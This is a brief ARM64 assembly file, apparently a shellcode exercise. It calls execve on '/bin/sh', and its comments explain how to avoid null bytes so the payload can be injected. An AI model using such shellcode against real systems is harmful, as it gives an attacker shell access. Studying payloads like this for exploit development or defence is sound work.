
.data
sh:
    .asciz "/bin/sh"

.text
.global _start

_start:
    adr x0, sh      // Use adr instead of ldr for fewer null bytes
    mov x1, xzr     // Move from zero register instead of using literal
    mov x2, xzr
    mov x8, #221    // Call execve
    svc #0x1337     // 

    //mov x0, #0
    //mov w8, #93
    //svc #0
